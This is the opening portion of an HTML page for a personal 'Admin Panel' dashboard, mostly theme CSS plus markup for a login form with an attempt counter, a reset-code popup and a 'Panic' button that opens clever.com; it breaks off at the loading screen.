<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Admin Panel - Enhanced Private System</title>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap');

:root {
    --primary-bg: #0a0a0a;
    --secondary-bg: #1a1a1a;
    --accent-color: #ff4500;
    --accent-secondary: #ff6b35;
    --text-primary: #ffffff;
    --text-secondary: #cccccc;
    --border-color: #333;
    --success-color: #00ff41;
    --warning-color: #ffaa00;
    --error-color: #ff0040;
}

/* Light Theme Variables */
body.light-theme {
    --primary-bg: #f0f2f5;
    --secondary-bg: #ffffff;
    --accent-color: #007bff; /* Using a blue accent for light mode as an example */
    --accent-secondary: #0056b3;
    --text-primary: #333333;
    --text-secondary: #666666;
    --border-color: #e0e0e0;
    --success-color: #28a745; /* Green for light theme success */
    --warning-color: #ffc107; /* Yellow for light theme warning */
    --error-color: #dc3545; /* Red for light theme error */
}

/* Adjust specific elements for light theme */
body.light-theme .login-box {
    background: rgba(255, 255, 255, 0.95);
    border: 3px solid var(--accent-color);
    box-shadow: 0 0 30px rgba(0, 123, 255, 0.3);
}
body.light-theme .login-box h2 {
    background: linear-gradient(45deg, var(--accent-color), #333);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
body.light-theme .login-box input {
    background: rgba(240, 240, 240, 0.8);
    border: 2px solid var(--border-color);
    color: #333;
}
body.light-theme .toggle-container span, body.light-theme .time-date-box .date-display {
    color: var(--text-primary);
}
body.light-theme .dashboard-header {
    background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
    color: white; /* Keep header text white for contrast */
}
body.light-theme .quick-btn {
    background: var(--accent-color);
    color: white;
}
body.light-theme .quick-btn:hover {
    background: var(--accent-secondary);
}
body.light-theme .dashboard-quickbar {
    background: var(--secondary-bg);
    border-color: var(--border-color);
}
body.light-theme .search-bar {
    background: var(--primary-bg);
    border-color: var(--border-color);
    color: var(--text-primary);
}
body.light-theme .search-btn {
    background: var(--accent-color);
}
body.light-theme .search-btn:hover {
    background: var(--accent-secondary);
}
body.light-theme .quickbar-time-info {
    background-color: var(--primary-bg);
    border-color: var(--border-color);
    color: var(--text-primary);
}
body.light-theme .panels-grid {
    border: none;
}
body.light-theme .panel {
    background: var(--secondary-bg);
    border: 1px solid var(--border-color);
    color: var(--text-primary);
}
body.light-theme .panel-title {
    color: var(--accent-color);
}
body.light-theme .panel-controls .panel-btn {
    background: var(--secondary-bg);
    border-color: var(--border-color);
    color: var(--text-secondary);
}
body.light-theme .panel-controls .panel-btn:hover {
    background: var(--accent-color);
    color: white;
}
body.light-theme .calendar-cell {
    background: var(--primary-bg);
    color: var(--text-primary);
}
body.light-theme .calendar-cell:hover, body.light-theme .calendar-cell.today {
    background: var(--accent-color);
    color: white;
}
body.light-theme .log-entry {
    background: var(--primary-bg);
    border-left-color: var(--accent-color); /* Kept accent for log importance */
    color: var(--text-primary);
}
body.light-theme .log-time {
    color: var(--text-secondary);
}
body.light-theme .login-entry-container {
    background-color: var(--primary-bg);
}
body.light-theme .login-entry-container.success {
    border-left: 4px solid var(--success-color);
}
body.light-theme .login-entry-container.failed {
    border-left: 4px solid var(--error-color);
}
body.light-theme .error-log-entry.error { /* This rule is specific to .error class, adjusted below */
    border-left: 4px solid var(--error-color);
    background-color: var(--primary-bg);
    color: var(--text-primary);
}

/* Fixed styling for system update items to match theme */
body.light-theme .system-update-item {
    background-color: var(--primary-bg); /* Match other list items */
    border-left: 4px solid var(--accent-secondary); /* Give it an accent */
    color: var(--text-primary);
}

body.light-theme .notification {
    background: var(--secondary-bg);
    border: 2px solid var(--success-color); /* Accent border to signify its status */
    color: var(--text-primary); /* Should contrast well with bg */
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1); /* Lighter shadow */
}

body.light-theme .settings-content {
    background: var(--secondary-bg);
    border-color: var(--accent-color);
    color: var(--text-primary);
}
body.light-theme .settings-content h2, body.light-theme .settings-content h3 {
    color: var(--accent-color);
}
body.light-theme .setting-item {
    background: var(--primary-bg);
    border-color: var(--border-color);
}
body.light-theme .tool-btn, body.light-theme .timer-controls .tool-btn {
    background: var(--accent-color);
    color: white;
}
body.light-theme .tool-btn:hover, body.light-theme .tool-btn.active, body.light-theme .timer-controls .tool-btn:hover {
    background: var(--accent-secondary);
}
body.light-theme #drawingCanvas {
    background: #f0f0f0; /* Ensure white canvas in light mode */
}
body.light-theme #textNotes {
    background: var(--primary-bg);
    color: var(--text-primary);
}
body.light-theme .calculator {
    background: var(--primary-bg);
}
body.light-theme .calc-display {
    background: var(--secondary-bg);
    border-color: var(--border-color);
    color: var(--accent-color);
}
body.light-theme .calc-buttons {
    border-color: var(--border-color);
}
body.light-theme .calc-btn {
    background: var(--secondary-bg);
    color: var(--text-primary);
}
body.light-theme .calc-btn:hover {
    background: var(--accent-color);
}
body.light-theme .calc-btn.operator {
    background: var(--accent-color);
}
body.light-theme .calc-btn.equals {
    background: var(--success-color);
    color: black;
}
body.light-theme .media-input {
    background: var(--secondary-bg);
    border-color: var(--border-color);
    color: var(--text-primary);
}
body.light-theme .media-frame {
    background: var(--secondary-bg);
}
body.light-theme .stat-item {
    background: var(--primary-bg);
    border-color: var(--border-color);
}
body.light-theme .keybind-input {
    background: var(--secondary-bg);
    border-color: var(--border-color);
    color: var(--text-primary);
}
/* Light theme specific styles for new elements */
body.light-theme .important-date-input,
body.light-theme .important-date-event-input,
body.light-theme .important-date-item,
body.light-theme #randomFact,
body.light-theme #dailyQuote,
body.light-theme .error-log-entry,
body.light-theme .announcement-bar,
body.light-theme .reset-popup .reset-field { /* Added announcement-bar and reset elements for light theme */
    background-color: var(--primary-bg) !important; /* Use !important to ensure override */
    color: var(--text-primary) !important;
    border-color: var(--border-color) !important;
}
body.light-theme .important-date-item {
    border-left-color: var(--accent-secondary) !important;
}
body.light-theme .click-button,
body.light-theme .reset-popup button { /* Added reset button for light theme */
    background: var(--accent-color) !important;
    color: white !important;
}
body.light-theme .click-button:hover,
body.light-theme .reset-popup button:hover { /* Added reset button hover for light theme */
    background: var(--accent-secondary) !important;
}
body.light-theme .announcement-content { /* Added announcement-content for light theme */
    color: var(--accent-color) !important;
}
body.light-theme .reset-popup {
    background: rgba(255, 255, 255, 0.98) !important; /* Lighter background for popup */
    border-color: var(--accent-color) !important;
    box-shadow: 0 0 30px rgba(0, 123, 255, 0.3) !important;
}
body.light-theme .reset-popup p {
    color: var(--text-primary) !important;
}


* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: 'Roboto', sans-serif;
    background: var(--primary-bg);
    color: var(--text-primary);
    overflow-x: hidden;
    transition: background-color 0.3s ease, color 0.3s ease;
}

/* Initialization Screen */
.init-screen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: radial-gradient(circle at center, #1a1a2e, #16213e, #0f0f0f);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
}

.rotating-cube {
    width: 80px;
    height: 80px;
    position: relative;
    transform-style: preserve-3d;
    animation: rotateCube 2s infinite linear;
    margin-bottom: 30px;
}

.cube-face {
    position: absolute;
    width: 80px;
    height: 80px;
    background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
    border: 2px solid #fff;
    opacity: 0.8;
}

.cube-face.front { transform: rotateY(0deg) translateZ(40px); }
.cube-face.back { transform: rotateY(180deg) translateZ(40px); }
.cube-face.right { transform: rotateY(90deg) translateZ(40px); }
.cube-face.left { transform: rotateY(-90deg) translateZ(40px); }
.cube-face.top { transform: rotateX(90deg) translateZ(40px); }
.cube-face.bottom { transform: rotateX(-90deg) translateZ(40px); }

@keyframes rotateCube {
    0% { transform: rotateX(0deg) rotateY(0deg); }
    100% { transform: rotateX(360deg) rotateY(360deg); }
}

.init-text {
    font-family: 'Orbitron', monospace;
    font-size: 24px;
    font-weight: 700;
    background: linear-gradient(45deg, #ff4500, #ff0040);
    background-size: 200% 200%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 3s ease-in-out infinite;
    text-align: center;
}

@keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
}

.code-rain {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    opacity: 0.3;
}

.code-char {
    position: absolute;
    color: var(--success-color);
    font-family: 'Courier New', monospace;
    font-size: 12px;
    animation: fall 3s linear infinite;
}

@keyframes fall {
    0% { transform: translateY(-100vh); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
}

/* Enhanced Login Styles */
.login-container {
    min-height: 100vh;
    background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    position: relative;
}

.login-quickbar {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    background: rgba(0, 0, 0, 0.9);
    backdrop-filter: blur(10px);
    padding: 10px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 1000;
    border-bottom: 1px solid var(--border-color);
}

.login-quickbar button {
    background: var(--accent-color);
    color: white;
    border: none;
    padding: 8px 15px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 12px;
    transition: all 0.3s ease;
    margin: 0 5px;
}

.login-quickbar button:hover {
    background: var(--accent-secondary);
    transform: translateY(-2px);
}

.panic-btn {
    background: var(--error-color) !important;
}

.login-box {
    background: rgba(26, 26, 26, 0.95);
    backdrop-filter: blur(15px);
    border: 3px solid var(--accent-color);
    border-radius: 20px;
    box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
    width: 420px;
    padding: 40px 30px;
    text-align: center;
    position: relative;
    margin-top: 60px;
    transition: all 0.3s ease;
}

.login-box.error-shake {
    animation: shake 0.5s ease-in-out;
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-10px); }
    75% { transform: translateX(10px); }
}

.login-box h2 {
    font-family: 'Orbitron', monospace;
    font-size: 28px;
    font-weight: 900;
    margin-bottom: 30px;
    background: linear-gradient(45deg, var(--accent-color), #fff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}

.input-group {
    position: relative;
    margin-bottom: 20px;
}

.login-box input {
    width: 100%;
    padding: 15px;
    background: rgba(30, 30, 30, 0.8);
    border: 2px solid var(--border-color);
    color: white;
    border-radius: 10px;
    font-size: 16px;
    transition: all 0.3s ease;
}

.login-box input:focus {
    border-color: var(--accent-color);
    box-shadow: 0 0 15px rgba(255, 69, 0, 0.3);
    outline: none;
}

.toggle-container {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin: 15px 0;
    padding: 10px;
    background: rgba(30, 30, 30, 0.5);
    border-radius: 10px;
}

.toggle-switch {
    position: relative;
    width: 50px;
    height: 25px;
    background: #333;
    border-radius: 25px;
    cursor: pointer;
    transition: all 0.3s ease;
}

.toggle-switch.active {
    background: var(--success-color);
}

.toggle-slider {
    position: absolute;
    top: 2px;
    left: 2px;
    width: 21px;
    height: 21px;
    background: white;
    border-radius: 50%;
    transition: all 0.3s ease;
}

.toggle-switch.active .toggle-slider {
    transform: translateX(25px);
}

.submit-btn {
    width: 100%;
    padding: 15px;
    background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
    color: white;
    font-size: 18px;
    font-weight: 700;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.submit-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(255, 69, 0, 0.4);
}

.time-date-box {
    background: rgba(30, 30, 30, 0.8);
    border: 2px solid var(--border-color);
    border-radius: 15px;
    padding: 20px;
    margin-top: 20px;
    text-align: center;
}

.time-display {
    font-family: 'Orbitron', monospace;
    font-size: 24px;
    font-weight: 700;
    color: var(--accent-color);
    margin-bottom: 10px;
}

.date-display {
    font-size: 16px;
    color: var(--text-secondary);
}

/* Dashboard Styles */
.dashboard {
    min-height: 100vh;
    background: var(--primary-bg);
    padding: 20px;
    display: none;
}

.dashboard.active {
    display: block;
}

.dashboard-header {
    background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
    padding: 20px 30px;
    border-radius: 15px;
    margin-bottom: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    color: white;
}

.dashboard-quickbar {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between; /* Space out the left and right groups */
    gap: 10px;
    margin-bottom: 20px;
    padding: 15px;
    background: var(--secondary-bg);
    border-radius: 15px;
    border: 1px solid var(--border-color);
    align-items: center; /* Align items vertically in quickbar */
}

/* Styles for the time displays within the search container */
.quickbar-time-info {
    display: flex;
    align-items: center;
    gap: 5px; /* Space between the text labels and the actual time */
    font-size: 12px;
    white-space: nowrap;
    background-color: var(--primary-bg); /* Add background */
    padding: 6px 10px; /* Add padding */
    border-radius: 6px; /* Add border-radius */
    border: 1px solid var(--border-color); /* Add border */
    color: var(--text-primary); /* Ensure text color adapts */
}
.quickbar-time-value {
    font-family: 'Orbitron', monospace;
    color: var(--accent-color);
    font-weight: bold;
    font-size: 13px; /* Slightly smaller than regular buttons but legible */
}

.search-group { /* New container for search input and time displays */
    display: flex;
    align-items: center;
    gap: 10px; /* Space between search and time info */
    flex-grow: 1; /* Allow it to grow, but respecting max-width */
    max-width: 50%; /* Adjust based on desired layout balance */
    min-width: 350px; /* Ensure minimum width for contents */
}
.search-container { /* This now just wraps the input and search button visually */
    position: relative;
    display: flex; /* Make it a flex container to align search bar and button */
    flex-grow: 1;
    max-width: 300px; /* Restrict max width of the input group */
}

.search-bar {
    width: 100%;
    padding: 10px 40px 10px 15px;
    background: var(--primary-bg);
    border: 2px solid var(--border-color);
    border-radius: 25px;
    color: white;
    font-size: 14px;
    flex-grow: 1; /* Allow the input to take available space */
}

.search-btn {
    position: absolute; /* Keep it absolute for placement inside the search input visuals */
    right: 5px;
    top: 50%;
    transform: translateY(-50%);
    background: var(--accent-color);
    border: none;
    border-radius: 50%;
    width: 30px;
    height: 30px;
    color: white;
    cursor: pointer;
    transition: all 0.3s ease;
}
.search-btn:hover {
    background: var(--accent-secondary);
}

.quick-btn-group { /* New container for all buttons to the right */
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    justify-content: flex-end; /* Align buttons to the right within their group */
}

.quick-btn {
    background: var(--accent-color);
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 12px;
    transition: all 0.3s ease;
    white-space: nowrap;
}

.quick-btn:hover {
    background: var(--accent-secondary);
    transform: translateY(-2px);
}

.notification {
    position: fixed;
    top: 20px;
    right: 20px;
    background: var(--secondary-bg); /* Use theme background */
    border: 2px solid var(--success-color); /* Accent border to signify its status */
    color: var(--text-primary); /* Use theme text color */
    padding: 15px 25px;
    border-radius: 10px;
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); /* Adjust shadow for both themes */
    z-index: 1000;
    animation: slideIn 0.5s ease;
}

@keyframes slideIn {
    from { transform: translateX(100%); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
}

.panels-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
    transition: opacity 0.3s ease-in-out;
}

.panel {
    background: var(--secondary-bg);
    border: 1px solid var(--border-color);
    border-radius: 15px;
    padding: 20px;
    position: relative;
    transition: all 0.3s ease;
    resize: both;
    overflow: auto;
    min-height: 200px;
}

.panel:hover {
    box-shadow: 0 5px 20px rgba(255, 69, 0, 0.2);
}

.panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 15px;
    padding-bottom: 10px;
    border-bottom: 1px solid var(--border-color);
}

.panel-title {
    font-size: 18px;
    font-weight: 700;
    color: var(--accent-color);
}

.panel-controls {
    display: flex;
    gap: 5px;
}

.panel-btn {
    background: none;
    border: 1px solid var(--border-color);
    color: var(--text-secondary);
    border-radius: 4px;
    width: 25px;
    height: 25px;
    cursor: pointer;
    font-size: 10px;
    transition: all 0.3s ease;
}

.panel-btn:hover {
    background: var(--accent-color);
    color: white;
}

.calendar-grid {
    display: grid;
    grid-template-columns: repeat(7, 1fr);
    gap: 5px;
    margin-top: 15px;
}

.calendar-cell {
    aspect-ratio: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--primary-bg);
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.3s ease;
    font-size: 12px;
}

.calendar-cell:hover {
    background: var(--accent-color);
}

.calendar-cell.today {
    background: var(--accent-color);
    color: white;
    font-weight: bold;
}

/* Login History Entries (Reused for general logs) */
.log-entry-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px;
    margin-bottom: 5px;
    border-radius: 6px;
    font-size: 12px;
    border: 1px solid var(--border-color);
    background-color: var(--primary-bg);
    transition: background-color 0.3s ease;
}
.log-entry-container.success {
    border-left: 4px solid var(--success-color);
    background-color: var(--primary-bg); /* Use primary for list item backgrounds */
}
.log-entry-container.failed {
    border-left: 4px solid var(--error-color);
    background-color: var(--primary-bg); /* Use primary for list item backgrounds */
}
.log-entry-container.info {
    border-left: 4px solid var(--accent-color);
}
.log-entry-container.warning {
    border-left: 4px solid var(--warning-color);
}
.log-entry-container.change {
    border-left: 4px solid var(--blue-500, #0066cc); /* A distinct color for changes */
}
.log-entry-container.download {
    border-left: 4px solid var(--purple-500, #8800cc); /* A distinct color for downloads */
}
.log-entry-container.command {
    border-left: 4px solid var(--green-500, #00cc44); /* A distinct color for commands */
}
.log-entry-status {
    font-weight: bold;
    color: var(--text-primary);
}
.log-entry-time {
    color: var(--text-secondary);
    font-size: 10px;
}

/* Important Dates styling */
.important-date-input, .important-date-event-input {
    width: 100%;
    padding: 8px 10px;
    margin-bottom: 8px;
    border-radius: 6px;
    border: 1px solid var(--border-color);
    background-color: var(--primary-bg); /* Added background color */
    color: var(--text-primary);
    font-size: 14px;
    transition: border-color 0.3s ease;
}
.important-date-input:focus, .important-date-event-input:focus {
    outline: none;
    border-color: var(--accent-color);
}
.important-date-item {
    padding: 8px 10px;
    margin-bottom: 8px;
    border-radius: 6px;
    background-color: var(--primary-bg); /* Added background color */
    border-left: 4px solid var(--accent-secondary); /* Accent for visual interest */
    color: var(--text-primary);
    font-size: 13px;
    display: flex;
    flex-direction: column;
    gap: 2px;
}
.important-date-item .date-time {
    font-weight: bold;
    color: var(--accent-color);
}
.important-date-item .event-description {
    color: var(--text-secondary);
}


/* System Updates Panel Styling */
.system-update-item {
    padding: 8px;
    border-radius: 6px;
    margin-bottom: 8px;
    font-size: 12px;
    background-color: var(--primary-bg); /* Apply theme-adaptive background */
    border-left: 4px solid var(--accent-secondary); /* Give it a subtle accent border */
    color: var(--text-primary); /* Ensure text color adapts */
    transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
}


/* Settings Modal */
.settings-modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0, 0, 0, 0.8);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 2000;
}

.settings-content {
    background: var(--secondary-bg);
    border: 2px solid var(--accent-color);
    border-radius: 20px;
    padding: 30px;
    width: 90%;
    max-width: 800px;
    max-height: 80vh;
    overflow-y: auto;
}

.settings-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    margin-top: 20px;
}

.setting-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 15px;
    background: var(--primary-bg);
    border-radius: 10px;
    border: 1px solid var(--border-color);
}

/* Drawing Tools */
.drawing-tools {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-top: 15px;
    padding: 15px;
    background: var(--primary-bg);
    border-radius: 10px;
}

.tool-btn {
    padding: 8px 12px;
    background: var(--accent-color);
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 12px;
    transition: all 0.3s ease;
}

.tool-btn:hover, .tool-btn.active {
    background: var(--accent-secondary);
    transform: scale(1.05);
}

.color-picker {
    width: 30px;
    height: 30px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
}

.thickness-slider {
    width: 100px;
    accent-color: var(--accent-color);
}

/* Timer/Stopwatch */
.timer-display {
    font-family: 'Orbitron', monospace;
    font-size: 36px;
    font-weight: 700;
    color: var(--accent-color);
    text-align: center;
    margin: 20px 0;
}

.timer-controls {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin-top: 15px;
}

/* Activity Logs */
/* Reusing .log-entry-container for consolidated logging */

/* Error Log Entries */
.error-log-entry {
    padding: 10px;
    background: var(--primary-bg); /* Added background color */
    border-left: 4px solid var(--error-color);
    margin-bottom: 10px;
    border-radius: 6px;
    font-size: 12px;
    display: flex;
    justify-content: space-between;
    color: var(--text-primary);
}
.error-log-time {
    color: var(--text-secondary);
    font-size: 10px;
}


/* Stats Display */
.stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
    gap: 15px;
    margin-top: 15px;
}

.stat-item {
    text-align: center;
    padding: 15px;
    background: var(--primary-bg);
    border-radius: 10px;
    border: 1px solid var(--border-color);
}

.stat-number {
    font-family: 'Orbitron', monospace;
    font-size: 24px;
    font-weight: 700;
    color: var(--accent-color);
}

.stat-label {
    font-size: 12px;
    color: var(--text-secondary);
    margin-top: 5px;
}

/* Themes */
.theme-selector {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
    gap: 10px;
    margin-top: 15px;
}

.theme-option {
    aspect-ratio: 1;
    border-radius: 10px;
    cursor: pointer;
    border: 3px solid transparent;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 12px;
    font-weight: bold;
}

.theme-option:hover, .theme-option.active {
    border-color: var(--accent-color);
    transform: scale(1.05);
}

/* Clicker Button (retained styling, but panel removed) */
.click-button {
    width: 100%;
    padding: 15px;
    background: var(--accent-color); /* Matches quick-btn */
    color: white;
    font-size: 18px;
    font-weight: 700;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-top: 10px;
}
.click-button:hover {
    background: var(--accent-secondary);
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(var(--accent-color), 0.4);
}
.click-count-display {
    font-family: 'Orbitron', monospace;
    font-size: 48px;
    font-weight: 900;
    color: var(--accent-color);
    text-align: center;
    margin-bottom: 20px;
    padding: 10px;
    background-color: var(--primary-bg); /* Add background */
    border-radius: 10px;
    border: 1px solid var(--border-color);
}

/* Daily Quotes & Random Facts content styling */
#randomFact, #dailyQuote {
    background-color: var(--primary-bg); /* Background for text content */
    padding: 15px;
    border-radius: 8px;
    border: 1px solid var(--border-color);
    line-height: 1.5;
    font-style: italic;
    color: var(--text-primary);
}

/* Announcement Bar */
.announcement-bar {
    background-color: var(--secondary-bg);
    border: 1px solid var(--border-color);
    border-radius: 10px;
    padding: 10px 20px;
    overflow: hidden; /* Crucial for the moving text */
    margin-bottom: 20px; /* Space between announcement and panels */
    position: relative;
}

.announcement-content {
    white-space: nowrap; /* Keep text on a single line */
    display: inline-block; /* Essential for animation */
    padding-left: 100%; /* Start the text off-screen to the right */
    color: var(--accent-color); /* Make the text stand out */
    font-weight: bold;
    animation: marquee 20s linear infinite; /* Adjust time as needed for speed */
}

@keyframes marquee {
    0% { transform: translateX(0%); }
    100% { transform: translateX(-100%); } /* Move fully to the left */
}

/* Reset Popup styles */
.reset-popup {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(26, 26, 26, 0.98);
    backdrop-filter: blur(10px);
    border: 3px solid var(--accent-color);
    border-radius: 15px;
    padding: 30px;
    text-align: center;
    z-index: 1001; /* Above login box */
    box-shadow: 0 0 40px rgba(255, 69, 0, 0.6);
    width: 350px;
    max-width: 90%;
    display: none; /* Hidden by default */
}

.reset-popup p {
    margin-bottom: 20px;
    font-size: 1.1em;
    color: var(--text-primary);
}

.reset-popup .reset-field {
    width: 100%;
    padding: 12px;
    margin-bottom: 20px;
    border-radius: 8px;
    border: 2px solid var(--border-color);
    background: var(--primary-bg);
    color: var(--text-primary);
    font-size: 16px;
    text-align: center;
}

.reset-popup button {
    width: 100%;
    padding: 12px;
    background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
    transition: all 0.3s ease;
}

.reset-popup button:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(255, 69, 0, 0.3);
}

/* Admin Command Buttons Styling */
.admin-command-group {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 15px;
    padding: 10px;
    background-color: var(--primary-bg);
    border-radius: 8px;
    border: 1px solid var(--border-color);
}
.admin-command-btn {
    flex-grow: 1;
    min-width: 150px;
    padding: 10px 15px;
    background: var(--accent-color);
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 13px;
    transition: all 0.3s ease;
    white-space: nowrap;
}
.admin-command-btn:hover {
    background: var(--accent-secondary);
    transform: translateY(-1px);
}
.admin-command-btn.dangerous {
    background: var(--error-color);
}
.admin-command-btn.dangerous:hover {
    background: #cc0033;
}


/* Responsive */
@media (max-width: 1200px) {
    .dashboard-quickbar .search-group {
        flex-direction: column; /* Stack search bar and time info on smaller screens */
        max-width: 100%;
        align-items: flex-start; /* Align text left */
    }
    .dashboard-quickbar .quickbar-time-info {
        width: 100%;
        justify-content: space-between;
    }
    .dashboard-quickbar .quick-btn-group {
        width: 100%; /* Make buttons take full width when stacked */
        justify-content: center;
    }
    .search-container {
        max-width: 100%;
    }
}
@media (max-width: 768px) {
    .login-box {
        width: 90%;
        margin: 20px auto;
    }

    .panels-grid {
        grid-template-columns: 1fr;
    }

    .dashboard-quickbar {
        flex-direction: column;
        gap: 10px;
    }

    .search-container {
        max-width: 100%;
    }
}

/* Loading Animation */
.loading-cube {
    width: 60px;
    height: 60px;
    position: relative;
    transform-style: preserve-3d;
    animation: loadingRotate 1.5s infinite linear;
}

.loading-face {
    position: absolute;
    width: 60px;
    height: 60px;
    background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
    border: 1px solid #fff;
    opacity: 0.9;
}

.loading-face.front { transform: rotateY(0deg) translateZ(30px); }
.loading-face.back { transform: rotateY(180deg) translateZ(30px); }
.loading-face.right { transform: rotateY(90deg) translateZ(30px); }
.loading-face.left { transform: rotateY(-90deg) translateZ(30px); }
.loading-face.top { transform: rotateX(90deg) translateZ(30px); }
.loading-face.bottom { transform: rotateX(-90deg) translateZ(30px); }

@keyframes loadingRotate {
    0% { transform: rotateX(0deg) rotateY(0deg); }
    100% { transform: rotateX(360deg) rotateY(360deg); }
}

/* Hidden by default */
.hidden { display: none !important; }
</style>
</head>
<body>

<!-- Initialization Screen -->
<div id="initScreen" class="init-screen">
<div class="rotating-cube">
<div class="cube-face front"></div>
<div class="cube-face back"></div>
<div class="cube-face right"></div>
<div class="cube-face left"></div>
<div class="cube-face top"></div>
<div class="cube-face bottom"></div>
</div>
<div id="initText" class="init-text">Initializing System...</div>
<div class="code-rain" id="codeRain"></div>
</div>

<!-- Login Screen -->
<div id="loginScreen" class="login-container hidden">
<div class="login-quickbar">
<div class="flex items-center gap-2">
<button class="panic-btn" onclick="window.open('https://clever.com', '_blank')">
<i class="fas fa-exclamation-triangle"></i> Panic
</button>
</div>
<div class="flex items-center gap-2">
<button onclick="adjustZoom(0.1)"><i class="fas fa-search-plus"></i> Zoom In</button>
<button onclick="adjustZoom(-0.1)"><i class="fas fa-search-minus"></i> Zoom Out</button>
</div>
</div>

<div class="login-box" id="loginBox">
<h2><i class="fas fa-shield-alt"></i> Private System</h2>

<div class="input-group">
<input type="text" id="username" placeholder="Enter Username..." autocomplete="off">
</div>

<div class="input-group">
<input type="password" id="password" placeholder="Enter Password..." autocomplete="off">
</div>

<div class="input-group">
<input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off">
</div>

<div class="toggle-container">
<span>Show Password</span>
<div class="toggle-switch" id="showPasswordToggle">
<div class="toggle-slider"></div>
</div>
</div>

<button class="submit-btn" id="submitBtn">
<i class="fas fa-sign-in-alt"></i> ACCESS SYSTEM
</button>

<div id="errorMsg" class="text-red-400 mt-4 text-sm"></div>
<div id="attemptsText" class="text-yellow-400 mt-2 text-sm">Attempts Left: 5</div>
</div>

<div class="time-date-box">
<div class="time-display" id="currentTime">00:00:00</div>
<div class="date-display" id="currentDate">Loading...</div>
<div class="toggle-container mt-4">
<span>24-Hour Format</span>
<div class="toggle-switch" id="timeFormatToggle">
<div class="toggle-slider"></div>
</div>
</div>
</div>

<!-- Reset Counter Popup (initially hidden) -->
<div id="resetPopup" class="reset-popup" role="dialog" aria-modal="true" aria-hidden="true">
<p>System Locked. Enter reset code to continue:</p>
<input type="password" id="resetField" class="reset-field" placeholder="Enter Reset Code...">
<button id="resetBtn">Reset Attempts</button>
</div>

</div>

<!-- Loading Screen -->
<div id="loadingScreen" class="init-screen hidden">
<div class="loading-cube">
